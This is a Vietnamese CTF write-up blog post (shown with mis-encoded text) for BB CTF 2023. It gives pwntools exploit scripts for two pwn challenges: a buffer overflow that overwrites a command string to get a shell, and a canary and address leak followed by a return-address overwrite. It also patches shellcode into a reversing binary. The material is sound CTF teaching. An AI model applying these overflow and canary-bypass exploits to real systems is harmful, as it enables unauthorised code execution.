---
title: Writeup BB CTF 2023
author: vietzettt
date:  2023-02-05
layout: post
published: true  
cover: /src/2023/BBCTF2023/00_cover.png
---

---

##### **Nguá»“n á»Ÿ Ä‘Ã¢y nhÃ¡ cÃ¡c báº¡n:** [ğŸ’€**ğŸ‘†ğŸ‘†ğŸ‘†**ğŸ’€](https://github.com/vietzettt/vietzettt.github.io/tree/main/src/2023/BBCTF2023)

Xin chÃ o má»i ngÆ°á»i, láº¡i lÃ  mÃ¬nh Ä‘Ã¢y, tháº­t báº¥t ngá» khi nghe Ä‘Æ°á»£c tin Ä‘Ã¢y lÃ  giáº£i dÃ nh cho ngÆ°á»i má»›i vÃ  trung trung, áº¥y váº­y mÃ  tÃ´i láº¡i khÃ´ng giáº£i Ä‘Æ°á»£c má»™t bÃ i nÃ o cá»§a máº£ng tÃ´i má»›i Ä‘au, chá»‰ giáº£i Ä‘Æ°á»£c má»™t bÃ i thuá»™c 1 máº£ng song hÃ nh lÃ  pwn.

VÃ¢ng Ä‘Ãºng lÃ  Ä‘Ã´i khi pháº£i luÃ´n kiáº¿m cho mÃ¬nh nhiá»u Ä‘iá»u má»›i...

VÃ¢ng dÃ¹ khÃ´ng Ä‘áº¿n giai Ä‘oáº¡n lÃ  nháº­n flag vÃ  gá»­i nhÆ°ng máº¥y bÃ i dÆ°á»›i Ä‘Ã¢y lÃ  tÃ´i Ä‘Ã£ dÃ nh thá»i gian phÃ¢n tÃ­ch code, mÃ  cÅ©ng cÃ³ bÃ i giáº£i gáº§n xong rá»“i mÃ  k fix láº¡i lÃ  Ä‘Æ°Æ¡c..

Sau hÃ´m nay tÃ´i sáº½ thÃ nh ngÆ°á»i chÆ¡i cáº£ PWN vÃ  RE luÃ´n))

### 1: Easy pwn

![title](/src/2023/BBCTF2023/ez_pwn/00_title_easy_pwn.png)

Xin chÃ o cÃ¡c báº¡n Ä‘Ã¢y lÃ  giáº£i Ä‘áº§u tiÃªn cÃ³ thÃªm pwn nhÃ©, cÅ©ng táº­p tÃ nh lÃ m cÃ¡c kiá»ƒu:
Äáº§u tiÃªn váº«n check, check vÃ  check. NhÆ°ng pwn thÃ¬ ta sáº½ check xem file cÃ³ bá»‹ dÃ­nh má»™t sá»‘ lá»—i thÆ°á»ng gáº·p khÃ´ng nhÆ° sau:

![check](/src/2023/BBCTF2023/ez_pwn/01_open_check.png)

Má»Ÿ IDA:

![main](/src/2023/BBCTF2023/ez_pwn/02_main.png)

vÃ  bÃªn stack:

![stack](/src/2023/BBCTF2023/ez_pwn/03_stack.png)

Nháº­n tháº¥y hÃ m `read` giÃ¡ trá»‹ biáº¿n `buf` táº­n 18 bytes nhÆ°ng á»Ÿ stack thÃ¬ chá»©a 8 bytes lÃ  Ä‘áº¿n biáº¿n `command` tháº¿ nÃªn cháº¯c cháº¯n sáº½ ghi Ä‘Ã¨ lÃªn giÃ¡ trá»‹ cá»§a `command`. Tháº¿ nÃªn tÃ´i cháº¡y nhÆ° sau nháº­p nhÆ° sau: `AAAAAAAApwd` thÃ¬ nháº­n Ä‘Æ°á»£c káº¿t quáº£. LÃºc chÆ¡i thÃ¬ tÃ´i khÃ´ng nhá»› hay khÃ´ng biáº¿t nÃªn cá»© mÃ² hay tÃ¬m ra nhá»¯ng cÃ¢u lá»‡nh nhÆ° `ls, less, head, tail, strings,...` Hay cÃ¡c options cá»§a `ls` thÃ¬ phÃ¡t hiá»‡n flag nÃ³ náº±m trong thÆ° viá»‡n áº©n -> sau Ä‘Ã³ file `flag.txt` trong thÆ° má»¥c áº©n nÃªn tÃ´i sá»­ dá»¥ng cÃ¢u lá»‡nh: `cat .[^.]*/*` lÃ  Ä‘á»c Ä‘Æ°á»£c file flag. Ã”i tháº­t tá»‡ khi tÃ´i Ä‘Ã£ máº¥t nhiá»u giá» vÃ o nÃ³.

CÃ³ cÃ¢u lá»‡nh nhanh vÃ  ngon hÆ¡n mÃ  tÃ´i quÃªn lÃ  `sh`. khi nháº­p `AAAAAAAAsh` thÃ¬ ta nháº­n Ä‘Æ°á»£c quyá»n sh sá»­ dá»¥ng cÃ¡c cÃ¢u lá»‡nh bÃ¬nh thÆ°á»ng Ä‘á»ƒ Ä‘á»c file... CÃ²n trÃªn kia lÃ  nÃ³ giá»›i háº¡n kÃ­ch thÆ°á»›c nháº­p vÃ o lÃ  cÃ³ 18 bytes nÃªn cáº§n tÃ¬m hiá»ƒu cÃ¢u lá»‡nh ngáº¯n mÃ  váº«n cháº¡y Ä‘Ãºng.

```py
from pwn import *

r = remote("pwn.bbctf.fluxus.co.in", 4001)
lst = ['cat .[^.]*/*.txt', 'cat .[^.]*/*','cat .[^.]*/flag*']

payload = b'no\nAAAAA' + b'cat .[^.]*/*'
r.sendline(payload)
r.interactive() 
```

VÃ  nháº­n Ä‘Æ°á»£c:

![result](/src/2023/BBCTF2023/ez_pwn/result_pwn.png)

### 2: Medium pwn

Tiáº¿p lÃ  lÃ  bÃ i mÃ  khiáº¿n tÃ´i cáº£ Ä‘Ãªm khÃ´ng ngá»§ cáº£ Ä‘Ãªm)))).

![title](/src/2023/BBCTF2023/Medium_pwn/00_title_medium_pwn.png)

Nhiá»‡m vá»¥ nÃ y thÃ¬ cÅ©ng lÃ  lá»—i overflow ghi Ä‘Ã¨ Ä‘áº¿n giÃ¡ trá»‹ nÃ o Ä‘á»ƒ sá»­ dá»¥ng nÃ³ nháº±m má»¥c Ä‘Ã­ch cháº¡y cÃ¡c khÃ¡c thay vÃ¬ cháº¡y chÆ°Æ¡ng trÃ¬nh máº·c Ä‘á»‹nh.

HÃ m main:

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  puts("Hi! I am the Stack Oracle.\n");
  while ( 1 )
    gimme_pointer();
}
```

VÃ²ng láº·p True náº¿u mÃ  chÆ°Æ¡ng trÃ¬nh khÃ´ng gáº·p báº¥t ká»³ lá»—i nÃ o trong khi thá»±c thi hÃ m `gimme_pointer()` thÃ¬ cháº¡y mÃ£i mÃ£i:))

```c
unsigned __int64 gimme_pointer()
{
  const void *v1; // [rsp+8h] [rbp-28h] BYREF
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u); //????
  printf("You are here: %p\n Give me an address and I will grant you 8 add_geted bytes:\n", buf);
  read(0, buf, 0x40uLL); //???
  hex_string_to_byte_array(buf, &v1, 16LL); // 
  printf("Here are the contents of %p:\n", v1);
  print_buf(v1, 8LL);
  return __readfsqword(0x28u) ^ v3;
}
```

Ta Ä‘i láº§n lÆ°á»£t vÃ o hÃ m nhÃ©:

```c
__int64 __fastcall hex_string_to_byte_array(__int64 a1, __int64 a2, int a3)
{
  __int64 result; // rax
  int v5; // [rsp+28h] [rbp-8h]
  unsigned int i; // [rsp+2Ch] [rbp-4h]

  v5 = 0;
  for ( i = 0; ; i += 2 )
  {
    result = i;
    if ( (int)i >= a3 )
      break;
    __isoc99_sscanf((int)i + a1, "%2hhx", a2 + v5++);
  }
  return result;
}
```

NhÃ¬n thÃ¬ ta biáº¿t hÃ m chuyá»ƒn 8 byte (16 kÃ½ tá»± char nhÃ¡) Ä‘áº§u cá»§a Ä‘áº§u vÃ o gÃ¡n vÃ o `v1` lÃ m Ä‘á»‹a chá»‰. Rá»“i in nÃ³ ra mÃ n hÃ¬nh cho mÃ¬nh.

```c
int __fastcall print_buf(__int64 a1, int a2)
{
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i < a2; ++i )
    printf("%02X", *(unsigned __int8 *)(i + a1));
  return puts("\n");
}
```

Rá»“i hÃ m nÃ y thÃ¬ in ra giÃ¡ trá»‹ cá»§a Ä‘á»‹a chá»‰ `v1` cá»§a nÃ³ trÃªn stack ra mÃ n hÃ¬nh.
á»¦a á»§a rá»“i flag á»Ÿ Ä‘Ã¢u??? Hay thÃ¬ lÃ m gÃ¬ bÃ¢y giá» nhá»‰ hÃ­ hÃ­ğŸ¥²ğŸ¥²
Äi kiá»ƒm tra qua cÃ¡c hÃ m cá»§a chÆ°Æ¡ng trÃ¬nh thÃ¬ tháº¥y cÃ³ hÃ m nÃ¨:

```c
unsigned __int64 this_function_literally_prints_the_flag()
{
  int fd; // [rsp+Ch] [rbp-54h]
  char buf[72]; // [rsp+10h] [rbp-50h] BYREF
  unsigned __int64 v3; // [rsp+58h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  fd = open("flag.txt", 0);
  read(fd, buf, 0x40uLL);
  puts(buf);
  close(fd);
  return __readfsqword(0x28u) ^ v3;
}
```

Rá»“i Ã½ tÆ°á»Ÿng Ä‘Ã£ cÃ³ lÃ  ta Ä‘Ã£ ghi Ä‘Ã¨ lÃªn Ä‘á»‹a chá»‰ return vá» Ä‘á»‹a chá»‰ cá»§a hÃ m Ä‘á»c file `flag.txt`:

1. TÃ¬m khoáº£ng cÃ¡ch giá»¯a Ä‘á»‹a chá»‰ hÃ m main so vá»›i Ä‘á»‹a chá»‰ `this_function_literally_prints_the_flag`.
2. Kiá»ƒm tra cáº¥u táº¡o stack á»Ÿ hÃ m `gimme_pointer` Ä‘á»ƒ tá»« Ä‘Ã³ input Ä‘Ãºng vá»‹ trÃ­ chÃ¨n Ä‘á»‹a chá»‰ Ä‘Ã³.

Stack `gimme_pointer` khi Ä‘Æ°á»£c phÃ¢n tÃ­ch ta nháº­n Ä‘Æ°á»£c:
    - read bufer (32 bytes) - nÆ¡i lÆ°u trá»¯ nhá»¯ng gÃ¬ mÃ¬nh nháº­p vÃ o vÃ  cÃ³ thá»ƒ Ä‘Ã¨ lÃªn cÃ¡c giÃ¡ trá»‹ nhÆ° stack canary vÃ  rbp point.
    - stack canary (8 bytes)
    - rbp point (8 bytes)
    - return address (8 bytes) - Ä‘Ã¢y lÃ  Ä‘á»‹a chá»‰ sau khi cháº¡y xong chÆ°Æ¡ng trÃ¬nh `gimme_pointer` thÃ¬ sáº½ nháº£y vá» Ä‘Ã³.

DÆ°á»›i Ä‘Ã¢y lÃ  code giáº£i chÆ°Æ¡ng trÃ¬nh tham kháº£o há»c há»i tá»« cÃ¡c cao nhÃ¢n:

```py

from pwn import *

r = remote('pwn.bbctf.fluxus.co.in', 4002)

r.readline()
r.readline()
add_get = int(r.readline().split()[-1], 16)
cookie_add = add_get + 0x18 #vá»‹ trÃ­ á»Ÿ stack chá»©a giÃ¡ trá»‹ coockie cá»§a má»—i láº§n cháº¡y nháº±m trÃ¡nh lá»—i canary
r.readline()

cookie_add = hex(int.from_bytes((cookie_add).to_bytes(8, 'little'), byteorder='big'))[2:]

r.sendline(cookie_add.encode())

r.recv().split()
cookie = r.recv().split()[0]

cookie = int.from_bytes((int(cookie, 16)).to_bytes(8,'big'), 'little')

print(f'Cookies: {hex(cookie)}')

base_add = add_get + 0x28 # Ä‘á»‹a chá»‰ stack chá»©a giÃ¡ trá»‹ rbp

base_add = hex(int.from_bytes((base_add).to_bytes(8, 'little'), byteorder='big'))[2:]

r.sendline(base_add.encode())

r.recv().split()
base = r.recv().split()[0]

base = int.from_bytes((int(base, 16)).to_bytes(8,'big'), 'little') - 0xa21

print(f'Base: {hex(base)}')

cookie = int.from_bytes((cookie).to_bytes(8, 'little'), byteorder='little')
base = int.from_bytes((base).to_bytes(8, 'little'), byteorder='little')


w = cookie_add.encode() + b'A' * 8 + p64(cookie) + p64(base+0x8f7) * 4 

r.sendline(w)

sleep(3)

print(r.recv().split()[7])
```

:)) Xong rá»“i Ä‘áº¥y.

Má»™t sá»‘ lÆ°u Ã½ thÃ¬ thÆ°á»ng khi gá»­i Ä‘á»‹a chá»‰ lÃªn thÃ¬ sáº½ á»Ÿ Ä‘á»‹nh dáº¡ng `big` endian nhÃ©.

### 3: ez-pz-xor

![title](/src/2023/BBCTF2023/ez_pz_xor/00_titile_ez_pz_xor.png)

Äá»‘i vá»›i bÃ i nÃ y thÃ¬ chÃºng ta bá»‹ tÃ¡c giáº£ lá»«a, khi bÃ i nÃ y cháº¡y vÃ  hiá»ƒn thá»‹ debug vÃ o flow cho ra káº¿t quáº£ nhÆ°ng khÃ´ng Ä‘Ãºng. Váº¥n Ä‘á» cá»§a chÃºng ta lÃ  tÃ¬m hiá»ƒu Ä‘Ãºng sá»­ dá»¥ng hÃ m nÃ o Ä‘Ãºng.

Kiá»ƒm tra thÃ¬ ta phÃ¡t hiá»‡n ra hÃ m nghi váº¥n `_do_global_dtors_aux()`.

VÃ  Ä‘Ã¢y lÃ  má»™t sá»‘ cÃ¢u lá»‡nh há»¯u Ã­ch:

+ Chuyá»ƒn string to hex (int):

```py
strings = ''
x = int(bytes.hex(strings.encode()),16)
# x = int(bytes.hex(b'hello'),16)
```

VÃ  hex to string

```py
strings = bytes.fromhex(hex(x)[2:])
```

Táº¡o file má»›i cÃ³ sá»­a Ä‘á»•i nhÃ©:

```py
with open('./ez-pz xor', 'rb') as f:
    l = f.read()

l = list(l)

f.close()

# thay báº±ng hÃ m write()
"""
mov r8, rdi
mov rax, 1
mov rdi, 1
mov rsi, r8
mov rdx, 8
syscall

x = [0x49, 0x89, 0xf8, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xc6, 0x48, 0xc7, 0xc2, 0x08, 0x00, 0x00, 0x00, 0x0f,0x05]
"""

x = [0x49, 0x89, 0xf8, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xc6, 0x48, 0xc7, 0xc2, 0x08, 0x00, 0x00, 0x00, 0x0f,0x05]

x = list(x)

for i in range(len(x)):
    l[0x1385+i] = x[i]

with open('./ez_injection', 'wb') as f:
    f.write(bytes(l))

```

Cháº¡y file má»›i Ä‘áº¥y ta nháº­n Ä‘Æ°á»£c string nguá»“n Ä‘Ã³. `BBBBBBBB` nháº­n Ä‘Æ°á»£c giÃ¡ trá»‹ `bFbFbFbF`. ta nháº­n Ä‘Æ°á»£c káº¿t quáº£ rá»“i sáº½ lÃ m xor láº¥y key rá»“i xor vá»›i `password` Ä‘á»ƒ ra:

```py
x = int(bytes.hex(b'BBBBBBBB'),16)
y = int(bytes.hex(b'bFbFbFbF'),16)
z = int(bytes.hex(b'password'),16)

a = int(hex(x^y),16)
print(bytes.fromhex(hex(a^z)[2:]))
```

ta nháº­n Ä‘Æ°á»£c `b'PeSwWkR'` -> gá»­i lÃªn lÃ  ra flag.....

### 4: More Control

![title](/src/2023/BBCTF2023/More%20Control/00_title_more_control.png)

Äá»‘i vá»›i nhiá»‡m vá»¥ nÃ y ta nháº­n Ä‘Æ°á»£c 1 file chÆ°Æ¡ng trÃ¬nh vÃ  1 file dá»¯ liá»‡u dáº¡ng bin. Äáº¡i láº¡i láº¥y chÆ°Æ¡ng trÃ¬nh nÃ y Ä‘á»ƒ load dá»¯ liá»‡u cá»§a file dá»¯ liá»‡u bin lÃ m data cá»§a ct.

(BÃ i nÃ y tÃ´i sáº½ nghiÃªn cá»©u sau:)
<!-- https://gynvael.coldwind.pl/?lang=en&id=763 -->